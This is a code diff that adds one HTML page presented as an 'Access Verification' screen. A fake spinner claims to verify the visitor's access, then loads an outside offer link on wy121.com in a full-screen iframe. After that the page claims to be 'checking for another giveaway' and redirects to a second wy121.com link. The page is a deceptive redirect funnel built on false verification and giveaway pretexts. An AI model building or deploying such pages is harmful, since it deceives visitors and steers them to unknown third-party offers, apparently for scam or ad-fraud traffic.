@@ -1,0 +1,58 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Access Verification</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body, html { height: 100%; width: 100%; font-family: Arial, sans-serif; background: white; color: #333; }
+    .center { display: flex; align-items: center; justify-content: center; flex-direction: column; height: 100vh; text-align: center; }
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-top: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    iframe { border: none; width: 100vw; height: 100vh; display: none; }
+  </style>
+</head>
+<body>
+  <div id="loader" class="center">
+    <h2>Hold on, we're verifying your access...</h2>
+    <div class="spinner"></div>
+  </div>
+
+  <iframe id="offerFrame" src=""></iframe>
+
+  <div id="redirecting" class="center" style="display:none;">
+    <h2>We're checking for another giveaway, please wait and don't close this browser...</h2>
+    <div class="spinner"></div>
+  </div>
+
+  <script>
+    setTimeout(() => {
+      document.getElementById('loader').style.display = 'none';
+      const iframe = document.getElementById('offerFrame');
+      iframe.style.display = 'block';
+      iframe.src = 'https://wy121.com/link?z=8810180';
+
+      setTimeout(() => {
+        document.getElementById('offerFrame').style.display = 'none';
+        document.getElementById('redirecting').style.display = 'flex';
+        setTimeout(() => {
+          window.location.href = 'https://wy121.com/link?z=8949381';
+        }, 4000);
+      }, 15000);
+    }, 6000);
+  </script>
+</body>
+</html>
